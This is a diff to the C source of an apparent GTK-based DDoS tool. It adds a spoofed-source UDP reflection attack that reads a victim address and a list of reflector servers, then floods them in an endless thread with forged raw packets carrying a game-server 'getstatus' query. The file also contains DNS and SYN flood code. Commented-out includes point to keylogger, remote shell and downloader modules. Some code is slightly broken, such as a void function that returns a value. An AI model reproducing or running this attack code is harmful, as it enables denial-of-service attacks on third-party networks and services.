@@ -23,10 +23,7 @@
 
 #include "../includes/constants.h"
 #include "../includes/callbacks_ddos.h"
-//#include "../includes/keylogger.h"
 #include "../includes/utils.h"
-//#include "../includes/remote_shell.h"
-//#include "../includes/downloader.h"
 
 /** ESSYN FLOOD **/
 static unsigned long int Q[4096], c = 362436;
@@ -35,12 +32,10 @@ static unsigned int floodport;
 /** CHARGEN DDOS **/
 //static uint32_t Q_chargen[4096], c_chargen = 362436;
 
+
 GtkWidget *main_win;
-
 GtkWidget *ddos_text_view;
-
 const gchar *script_command = NULL;
-
 
 
 void cb_udp_ddos_script_1(GtkButton *button, gpointer user_data)
@@ -55,7 +50,7 @@ void cb_udp_ddos_script_1(GtkButton *button, gpointer user_data)
     GtkTextIter start;
     GtkTextIter end;
 
-    size_t i = 0;
+    //size_t i = 0;
 
     logs_msg = malloc(128 * sizeof(char));
     if(logs_msg == NULL)
@@ -1519,7 +1514,7 @@ void *flood_dns(void *par1)
     iph->ttl = MAXTTL;
     iph->protocol = IPPROTO_UDP;
     iph->check = 0;
-    iph->saddr = inet_addr("192.168.3.100");
+    iph->saddr = inet_addr("192.168.3.100");   /**     A CHECKER  ***/
 
     iPayloadSize += sizeof(struct iphdr);
 
@@ -1658,3 +1653,281 @@ void ParseResolverLine(char *strLine, int iLine)
     }
 }
 
+
+void cb_udp_spoofed(void)
+{
+    GtkWidget *IP_dialog = NULL;
+    GtkWidget *port_dialog = NULL;
+    GtkWidget *ip_file_dialog = NULL;
+    GtkWidget *time_dialog = NULL;
+    GtkWidget *message_dialog = NULL;
+
+    GtkWidget *get_arg_entry_1 = NULL;
+    GtkWidget *get_arg_entry_2 = NULL;
+    GtkWidget *get_arg_entry_3 = NULL;
+    GtkWidget *get_arg_entry_4 = NULL;
+    GtkWidget *get_arg_entry_5 = NULL;
+
+    const gchar *IP = NULL;
+    const gchar *port_number_spoof = NULL;
+    const gchar *ip_file = NULL;
+    const gchar *time_duration = NULL;
+    const gchar *message = NULL;
+
+    GtkTextBuffer *text_buffer = NULL;
+    gchar *text = NULL;
+    GtkTextIter start;
+    GtkTextIter end;
+
+
+    /* Obtaining the buffer associated with the widget. */
+    text_buffer = gtk_text_view_get_buffer(GTK_TEXT_VIEW(ddos_text_view));
+
+    /** Set the default buffer text. **/
+    gtk_text_buffer_set_text(text_buffer, "Usage: <IP> <PORT> <ip_list.txt> <TIME> <MESSAGE>", -1);
+
+    /** Obtain iters for the start and end of points of the buffer **/
+    gtk_text_buffer_get_start_iter(text_buffer, &start);
+    gtk_text_buffer_get_end_iter(text_buffer, &end);
+
+    /** Get the entire buffer text. **/
+    text = gtk_text_buffer_get_text(text_buffer, &start, &end, FALSE);
+
+    /** Print the text **/
+    g_print("%s", text);
+
+    g_free(text);
+
+    IP_dialog = gtk_dialog_new_with_buttons("Enter Target IP", GTK_WINDOW(main_win),  GTK_DIALOG_MODAL, GTK_STOCK_APPLY, GTK_RESPONSE_APPLY, NULL);
+    port_dialog = gtk_dialog_new_with_buttons("Enter Target Port", GTK_WINDOW(main_win),  GTK_DIALOG_MODAL, GTK_STOCK_APPLY, GTK_RESPONSE_APPLY, NULL);
+    ip_file_dialog = gtk_dialog_new_with_buttons("Enter IP File Name", GTK_WINDOW(main_win),  GTK_DIALOG_MODAL, GTK_STOCK_APPLY, GTK_RESPONSE_APPLY, NULL);
+    time_dialog = gtk_dialog_new_with_buttons("Enter Time", GTK_WINDOW(main_win),  GTK_DIALOG_MODAL, GTK_STOCK_APPLY, GTK_RESPONSE_APPLY, NULL);
+    message_dialog = gtk_dialog_new_with_buttons("Enter Your Message", GTK_WINDOW(main_win),  GTK_DIALOG_MODAL, GTK_STOCK_APPLY, GTK_RESPONSE_APPLY, NULL);
+
+    gtk_widget_set_size_request(IP_dialog, 360, 100);
+    gtk_widget_set_size_request(port_dialog, 360, 100);
+    gtk_widget_set_size_request(ip_file_dialog, 360, 100);
+    gtk_widget_set_size_request(time_dialog, 360, 100);
+    gtk_widget_set_size_request(message_dialog, 360, 100);
+
+    get_arg_entry_1 = gtk_entry_new();
+    get_arg_entry_2 = gtk_entry_new();
+    get_arg_entry_3 = gtk_entry_new();
+    get_arg_entry_4 = gtk_entry_new();
+    get_arg_entry_5 = gtk_entry_new();
+
+    gtk_box_pack_start(GTK_BOX(GTK_DIALOG(IP_dialog)->vbox), get_arg_entry_1, TRUE, FALSE, 0);
+    gtk_box_pack_start(GTK_BOX(GTK_DIALOG(port_dialog)->vbox), get_arg_entry_2, TRUE, FALSE, 0);
+    gtk_box_pack_start(GTK_BOX(GTK_DIALOG(ip_file_dialog)->vbox), get_arg_entry_3, TRUE, FALSE, 0);
+    gtk_box_pack_start(GTK_BOX(GTK_DIALOG(time_dialog)->vbox), get_arg_entry_4, TRUE, FALSE, 0);
+    gtk_box_pack_start(GTK_BOX(GTK_DIALOG(message_dialog)->vbox), get_arg_entry_5, TRUE, FALSE, 0);
+
+
+    gtk_widget_show_all(GTK_DIALOG(IP_dialog)->vbox);
+    switch(gtk_dialog_run(GTK_DIALOG(IP_dialog)))
+    {
+        case GTK_RESPONSE_APPLY:
+            IP = gtk_entry_get_text(GTK_ENTRY(get_arg_entry_1));
+            gtk_widget_hide(IP_dialog);
+            break;
+
+        default:
+            gtk_widget_hide(IP_dialog);;
+            break;
+    }
+
+    gtk_widget_show_all(GTK_DIALOG(port_dialog)->vbox);
+    switch(gtk_dialog_run(GTK_DIALOG(port_dialog)))
+    {
+        case GTK_RESPONSE_APPLY:
+            port_number_spoof = gtk_entry_get_text(GTK_ENTRY(get_arg_entry_2));
+            gtk_widget_hide(port_dialog);
+            break;
+
+        default:
+            gtk_widget_hide(port_dialog);
+            break;
+    }
+
+    gtk_widget_show_all(GTK_DIALOG(ip_file_dialog)->vbox);
+    switch(gtk_dialog_run(GTK_DIALOG(ip_file_dialog)))
+    {
+        case GTK_RESPONSE_APPLY:
+            ip_file = gtk_entry_get_text(GTK_ENTRY(get_arg_entry_3));
+            gtk_widget_hide(ip_file_dialog);
+            break;
+
+        default:
+            gtk_widget_hide(ip_file_dialog);
+            break;
+    }
+
+    gtk_widget_show_all(GTK_DIALOG(time_dialog)->vbox);
+    switch(gtk_dialog_run(GTK_DIALOG(time_dialog)))
+    {
+        case GTK_RESPONSE_APPLY:
+            time_duration = gtk_entry_get_text(GTK_ENTRY(get_arg_entry_4));
+            gtk_widget_hide(time_dialog);
+            break;
+
+        default:
+            gtk_widget_hide(time_dialog);
+            break;
+    }
+
+    gtk_widget_show_all(GTK_DIALOG(message_dialog)->vbox);
+    switch(gtk_dialog_run(GTK_DIALOG(message_dialog)))
+    {
+        case GTK_RESPONSE_APPLY:
+            message = gtk_entry_get_text(GTK_ENTRY(get_arg_entry_5));
+            gtk_widget_hide(message_dialog);
+            break;
+
+        default:
+            gtk_widget_destroy(IP_dialog);
+            gtk_widget_destroy(port_dialog);
+            gtk_widget_destroy(time_dialog);
+            gtk_widget_destroy(message_dialog);
+            return;
+    }
+
+    printf("IP = %s\n", IP);
+    printf("port = %s\n", port_number_spoof);
+    printf("IP file name = %s\n", ip_file);
+    printf("time = %s\n", time_duration);
+    printf("mesage = %s\n", message);
+
+    struct file_list *list = NULL;
+	int list_size = 0;
+
+	struct pthread_param param;
+	pthread_t udp_attack;
+
+	srand(time(0));
+
+	FILE *pFile = fopen(ip_file, "r");
+	if (pFile == NULL)
+	{
+		printf("[X] Cannot open file\n");
+		return -1;
+	}
+
+	while (!feof(pFile))
+	{
+		char *line;
+		line = getLine(pFile);
+
+		char ip[1024];
+		int port;
+
+		if (sscanf(line, "%99[^:]:%99d", ip, &port) == 2)
+		{
+			list_size++;
+			list = (struct file_list *) realloc(list, sizeof(struct file_list) * list_size);
+			list[list_size - 1].ip = inet_addr(ip);
+			list[list_size - 1].port = port;
+        }
+
+		free(line);
+	}
+
+	fclose(pFile);
+
+	param.victim_ip = inet_addr(IP);
+	param.victim_port = atoi(port_number_spoof);
+
+	param.list = list;
+	param.list_size = list_size;
+
+	param.message = "\xFF\xFF\xFF\xFF\x67\x65\x74\x73\x74\x61\x74\x75\x73\x10";
+
+	pthread_create( &udp_attack, NULL, thread_attack, (void*) &param);
+
+	wait_time_end(atoi(time_duration));
+
+    pthread_cancel(udp_attack);
+
+	return;
+}
+
+
+void attack(unsigned long srcip, int srcport, unsigned long destip, int destport, char *message)
+{
+    int s = socket (PF_INET, SOCK_RAW, IPPROTO_UDP);
+
+    char packet[4096];
+
+    struct iphdr *iph = (struct iphdr *) packet;
+
+	struct udphdr *udph = (struct udphdr *) (packet + sizeof(struct ip));
+
+    struct sockaddr_in sin;
+    struct pseudo_header psh;
+
+    sin.sin_family = AF_INET;
+    sin.sin_port = htons(destport);
+    sin.sin_addr.s_addr = destip;
+
+    memset (packet, 0, 4096);
+
+    iph->ihl = 5;
+    iph->version = 4;
+    iph->tos = 16;
+    iph->tot_len = sizeof (struct ip) + sizeof (struct udphdr) + strlen(message);
+    iph->id = htonl (54321);
+    iph->frag_off = 0;
+    iph->ttl = 255;
+    iph->protocol = IPPROTO_UDP;
+    iph->check = 0;
+    iph->saddr = srcip;
+    iph->daddr = sin.sin_addr.s_addr;
+
+	udph->source = htons(srcport);
+    udph->dest = htons(destport);
+    udph->len = htons(sizeof(struct udphdr));
+	udph->check = 0;
+
+	strncpy((char *)udph + sizeof (struct udphdr),message, 4096 - (sizeof (struct udphdr) + sizeof (struct ip)));
+
+	int one = 1;
+	const int *val = &one;
+
+	if (setsockopt (s, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0)
+	{
+		printf ("[x] Cannot set socket options (are we r00t?)\n");
+		return;
+	}
+
+	if (sendto(s, packet, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof (sin)) < 0)
+		printf("[x] Error sending packet\n");
+
+	close(s);
+    return;
+}
+
+
+void *thread_attack(void *thread_params, const gchar *port_number_spoof)
+{
+	struct pthread_param *params = thread_params;
+	int i;
+
+	while (1)
+		for (i = 0; i < params->list_size; i++)
+			attack(params->list[i].ip, rand() % 65534 + 1, params->victim_ip, params->list[i].port, params->message);
+}
+
+char *getLine(FILE *f)
+{
+	char *buffer = malloc(sizeof(char));
+	int pos = 0;
+	char c;
+
+	do
+	{
+        c = fgetc(f);
+		if(c != EOF) buffer[pos++] = (char)c;
+		buffer = (char*)realloc(buffer, sizeof(char) * (pos + 2));
+	}while (c != EOF && c != '\n');
+
+	return buffer;
+}
